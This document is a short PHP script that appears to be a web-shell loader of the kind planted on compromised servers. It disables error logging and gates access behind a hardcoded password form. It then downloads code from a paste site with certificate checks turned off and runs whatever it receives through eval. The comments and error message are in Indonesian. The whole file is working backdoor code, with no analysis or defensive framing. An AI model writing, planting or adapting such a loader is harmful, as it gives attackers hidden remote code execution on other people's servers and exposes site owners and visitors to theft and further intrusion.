<?php
// Turn off all error reporting and logging
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

$password = "hadii";

if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['login'] = true;
    } else {
        echo '<div style="position:fixed;top:10px;left:10px;">
                <form method="post">
                  <input type="password" name="pass" placeholder="password">
                  <input type="submit" value="login">
                </form>
              </div>';
        exit;
    }
}

// Script utama setelah login
$url = 'blob:https://paste.sh/73e73a44-b02e-411f-8cc8-4633b17b4f1e';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$code = curl_exec($ch);
curl_close($ch);

if (!$code) {
    die('Gagal ambil file dari URL Cok :(.');
}

eval("?>$code");
?>